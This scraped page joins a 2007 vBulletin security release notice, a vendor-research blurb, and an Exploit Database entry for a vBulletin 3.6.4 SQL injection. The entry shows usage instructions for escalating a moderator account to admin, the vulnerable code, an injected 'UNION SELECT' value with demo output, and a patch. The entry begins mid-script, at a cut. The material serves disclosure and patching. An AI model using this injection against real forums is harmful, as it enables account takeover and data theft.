  ## vBulletin 3.6.5 Released

  Thu 1 Mar '07, 7:24am

  **vBulletin 3.6.5**

  This morning, an exploit was reported, which affects vBulletin versions 3.5.x and 3.6.x. Although the report is inaccurate and the published exploit does not work as claimed unless a highly unlikely set of circumstances exist, it has highlighted a potential security issue in these vBulletin versions.

  Therefore, we have decided to release updated versions, these being vBulletin 3.5.8 and 3.6.5. We recommend that all customers running vBulletin 3.5.x or 3.6.x upgrade to the appropriate version or apply the supplied patch as soon as possible.

  It is worth noting that in order to exploit the problem highlighted by the report, the attacking user must satisfy the following conditions:
  + Must already have moderator privileges
  + Must share the same IP address (or the number of IP octets specified in the Admin Control Panel for IP address matching) with an existing administrator who is currently logged in to the Admin Control Panel
  + Must know the Alt-IP and user agent (exact browser identification) of the administrator
  + **OR** must know the license number of the site being attackedGiven these requirements, the privilege escalation exploit claimed by the report is almost impossible to achieve.

  **Bugs Fixed in vBulletin 3.6.5**

  **The Security Flaw**The reported security flaw described in this announcement, which could potentially allow a SELECT query to be hijacked, has been addressed.**Safari Cookies**A problem where users of the Apple browser Safari would be logged off the system prematurely when vBulletin runs on specific servers has been resolved.

  [More info...](http://www.vbulletin.com/forum/bugs36.php?do=view&bugid=1116)**Internet Explorer 7 Compatability**Much has been said about Microsoft's decision to make the Javascript prompt() function throw a security warning whenever it is called. This change resulted in vBulletin's text editor system throwing security warnings whenever a user tried to insert an image or an email link. The use of prompt() for Internet Explorer 7 users has now been discontinued in favour of an alternative method of collecting user input.

  [More info...](http://www.vbulletin.com/forum/bugs36.php?do=view&bugid=1263)

  Additionally, improvements in Internet Explorer 7 mean that certain aspects of the vBulletin pop-up menu system, which were previously required to circumvent rendering issues, can now be bypassed. Most notable amongst these is the code that hides all <select> elements that would intersect with the menu when opened.**Fix for Infractions Bug**A problem where infraction expiration was not cleaned-up properly has been addressed.

  [More info...](http://www.vbulletin.com/forum/bugs36.php?do=view&bugid=1448)**Workaround for a FreeBSD Regular Expression Error on Login**Some users running recent versions of PHP running on FreeBSD have encountered a bug in the regular expression engine that caused an error to be shown when logging in. We have worked around this problem. However, it may still appear in other areas, so we are trying to find a proper fix for the issue.

  **Updating your vBulletin to Fix the Potential Exploit**

  There are two ways in which you can fix the potential exploit in your version of vBulletin:
  1. **Full Upgrade**: The best way to fix the problem is to perform a full upgrade by downloading the complete 3.6.5 package from the [vBulletin Members' Area](http://members.vbulletin.com/) and following the regular [upgrade instructions](http://www.vbulletin.com/docs/html/upgrade?manualversion=30602500).
  2. **Patch**: A second option is to download the patch files discussed in this thread and upload them to your web server, overwriting the existing files. The patch is available from the [Members' Area patch page](http://members.vbulletin.com/patches.php) or you can find it attached to this thread.Please note that vBulletin 3.6.5 requires at least **PHP 4.3.3** and **MySQL 4.0.16** or later.

  **A Note Regarding vBulletin 3.6.6**

  The publication of this exploit has required a swift release of an updated version to fix the published problem. The original intention for vBulletin 3.6.5 had been to include a number of other bug fixes and improvements that have been reported since 3.6.4.

  Unfortunately, the necessity of bringing out a version quickly to fix the exploit has meant that many of these fixes have not had sufficient time to be fully tested to the extent that we would like and have therefore been kept back for vBulletin 3.6.6.

  We understand that this may be frustrating to our customers, and in order to minimize the inconvenience, we have ensured that this vBulletin 3.6.5 release contains no template or phrase changes, which will hopefully make upgrading as painless as possible.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# vBulletin 3.6.4 - 'inlinemod.php?postids' SQL Injection

vBulletin <= 3.6.4 inlinemod.php "postids" sql injection / privilege
escalation by session hijacking exploit
by rgod
mail: retrog at alice dot it
site: http://retrogod.altervista.org

Works regardless of php.ini settings, you need a Super Moderator account
to copy posts among threads, to be launched while admin is logged in to
the control panel, this will give you full admin privileges
note: this will flood the forum with empty threads even!
-----------------------------------------------------------------------------
');

if ($argc<7) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path user pass forumid postid OPTIONS
host:      target server (ip/hostname)
path:      path to vbulletin
user/pass: you need a moderator account
forumid:   existing forum
postid:    existing post
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /vbulletin/ rgod mypass 2 121 -P1.1.1.1:80
php '.$argv[0].' localhost /vbulletin/ rgod mypass 1 143 -p81

vulnerable code in inlinemod.php near lines 185-209:

...
	case 'docopyposts':

		$vbulletin->input->clean_array_gpc('p', array(
			'postids' => TYPE_STR,
		));

		$postids = explode(',', $vbulletin->GPC['postids']);
		foreach ($postids AS $index => $postid)
		{
			if ($postids["$index"] != intval($postid))
			{
				unset($postids["$index"]);
			}
		}

		if (empty($postids))
		{
			eval(standard_error(fetch_error('no_applicable_posts_selected')));
		}

		if (count($postids) > $postlimit)
		{
			eval(standard_error(fetch_error('you_are_limited_to_working_with_x_posts', $postlimit)));
		}
		break;
...
when an element of $postids array is not an integer, it fails to unset() the proper value.

An example:

<?php
$foo[1]="99999) UNION SELECT foo FROM foo WHERE foo=1 LIMIT 1/*";
$foo[2]=intval($foo[1]);

echo $foo[1]."\n";
echo $foo[2]."\n";
if ($foo[1] != $foo[2])
{
 echo "they are different";
}
else
{
 echo "they match!";
}
?>

output:

99999) UNION SELECT foo FROM foo WHERE foo=1 LIMIT 1/*
99999
they match!

this because when php tries to comparise a string with an integer
it tries to convert the string in its integer value, it chooses the first integer chars
of the string itself!
so unset() never run!

the result is sql injection near lines 3792-3800:

...
	$posts = $db->query_read_slave("
		SELECT post.postid, post.threadid, post.visible, post.title, post.username, post.dateline, post.parentid, post.userid,
			thread.forumid, thread.title AS thread_title, thread.postuserid, thread.visible AS thread_visible, thread.firstpostid,
			thread.sticky, thread.open, thread.iconid
		FROM " . TABLE_PREFIX . "post AS post
		LEFT JOIN " . TABLE_PREFIX . "thread AS thread USING (threadid)
		WHERE postid IN (" . implode(',', $postids) . ")
		ORDER BY post.dateline
	");
...

this exploit extract various session hashes from the database
to authenticate as admin and to change the privileges of a registered user
I could not find a way to see results inside html, so this asks true/false
questions to the database, copying posts around threads

possible patch, replace:
foreach ($postids AS $index => $postid)
		{
		   	if ($postids["$index"] != intval($postid))
			{
			    unset($postids["$index"]);
			}
		}

with:

foreach ($postids AS $index => $postid)
		{
	       $postids["$index"]=(int)$postids["$index"];
	    }

and, some line before:

foreach ($threadids AS $index => $threadid)
		{
			if ($threadids["$index"] != intval($threadid))
			{
				unset($threadids["$index"]);
			}
		}

with:

foreach ($threadids AS $index => $threadid)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
